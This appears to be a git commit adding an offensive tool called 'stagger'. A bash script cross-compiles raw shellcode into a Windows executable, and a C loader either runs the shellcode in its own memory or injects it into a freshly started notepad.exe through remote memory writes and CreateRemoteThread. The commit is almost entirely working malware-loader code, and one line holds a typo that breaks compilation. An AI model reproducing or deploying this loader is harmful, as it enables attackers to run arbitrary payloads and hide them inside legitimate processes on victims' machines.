2c4992aeb55e6b213977fd42ab607fc60e560ad4
Proton <116664517+Proton-git@users.noreply.github.com>
2022-10-26 19:31:45 +0200

    Add files via upload

---
+++ stagger/binCompiler.sh
@@ -0,0 +1,20 @@
+﻿#!/bin/bash
+if [ $# -lt 3 ]
+    then echo "Need shellcode binary file to compile: eg: binCompiler.sh 86/64 <shellcode.bin> <output.exe>"
+else
+    if [ ! -f $2 ]
+        then echo "!! Path does not exist: $2"
+else
+        cp $2 shellcode.bin -rf
+        xxd -i shellcode.bin > shellcode.h
+        if [ $1 == "86" ]
+        then echo "* Compiling x86" 
+        i686-w64-mingw32-gcc runshellcode.c -o S3 -s
+else
+        echo "* Compiling x64"
+        x86_64-w64-mingw32-gcc runshellcode.c -o S3 -s
+        fi	
+        echo "+ Success"
+        rm -rf shellcode.bin shellcode.h 
+    fi 
+fi
---
+++ stagger/runshellcode.c
@@ -0,0 +1,34 @@
+﻿#include <windows.h>
+#include <stdio.h>
+#include <winternl.h>
+#include "shellcode.h"
+
+int main(int argc, char* argv[]) { 
+    if (argc == 1) {
+        DWORD IpThreadld = 0;
+        DWORD flOldProtect = 0;
+        LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shellcode_bin), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE); 
+        memcpy(addressPointer, shellcode_bin, shellcode_bin_len);
+        VirtualProtect(addressPointer, shellcode_bin_len, PAGE_EXECUTE_READ, &flOldProtect);
+        ((void(*)())addressPointer)();
+        WaitForSingleObject((HANDLE)-1, -1);
+     } else {
+            STARTUPINFOA sinfo = { 0 };
+            sinfo.cb = sizeof(sinfo);
+            PROCESS_INFORMATION pinfo = { 0 };
+            if (CreateProcessA(NULL, "notepad.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
+            LPVOID addressPointer = VirtualAllocEx(pinfo.hProcess, NULL, sizeof(shellcode_bin), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE); 
+            WriteProcessMemory(pinfo.hProcess, addressPointer, shellcode bin, shellcode_bin_len, 0); 
+            printf("pid: %lu\n", pinfo.dwProcessId); 
+            printf("Allocated: %p\n", addressPointer);
+            DWORD tID = 0;
+            DWORD flOldProtect = 0;
+
+            VirtualProtectEx(pinfo.hProcess, addressPointer, shellcode_bin_len, PAGE_EXECUTE_READ, &flOldProtect); 
+         getchar();
+         CreateRemoteThread(pinfo.hProcess, NULL, 0, addressPointer, NULL, 0, &tID); 
+            printf("tID: %lu\n", tID);
+       }
+    }
+   return 0;
+}
